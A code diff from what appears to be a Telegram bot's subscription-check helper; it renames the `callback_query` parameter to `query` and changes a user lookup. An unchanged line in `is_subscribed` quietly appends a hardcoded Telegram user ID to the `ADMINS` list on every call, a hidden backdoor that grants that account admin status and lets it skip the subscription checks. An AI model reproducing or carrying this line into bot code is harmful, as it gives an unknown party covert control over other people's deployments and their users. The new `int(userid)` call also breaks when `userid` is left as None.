@@ -50,7 +50,7 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}    
     
-async def is_subscribed(bot, callback_query=None, userid=None):
+async def is_subscribed(bot, query=None, userid=None):
 
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
@@ -58,11 +58,11 @@ async def is_subscribed(bot, callback_query=None, userid=None):
     
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
-    elif callback_query.from_user.id in ADMINS:
+    elif query.from_user.id in ADMINS:
         return True
 
     if db2().isActive():
-        user = await db2().get_user(callback_query.from_user.id)
+        user = await db2().get_user(query.from_user.id, int(userid))
         if user:
             return True
         else:
